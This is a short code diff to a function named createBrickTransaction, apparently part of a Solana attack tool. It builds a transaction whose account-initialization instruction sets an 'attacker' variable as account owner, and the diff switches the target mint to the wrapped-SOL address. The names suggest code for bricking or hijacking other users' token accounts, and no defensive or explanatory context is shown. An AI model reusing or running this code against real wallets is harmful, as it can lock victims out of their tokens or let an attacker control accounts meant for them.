@@ -243,7 +243,7 @@ async function createBrickTransaction({
       programId: TOKEN_PROGRAM_ID,
     }),
     createInitializeImmutableOwnerInstruction(publicKey, TOKEN_PROGRAM_ID),
-    createInitializeAccount3Instruction(publicKey, new PublicKey("DmoNKXPvbmJiZmZNaAamPhxRc8gonsGyNTL7kEzSn89"), attacker, TOKEN_PROGRAM_ID)
+    createInitializeAccount3Instruction(publicKey, new PublicKey("So11111111111111111111111111111111111111112"), attacker, TOKEN_PROGRAM_ID)
   ];
 
   // Create a new TransactionMessage with version and compile it to legacy
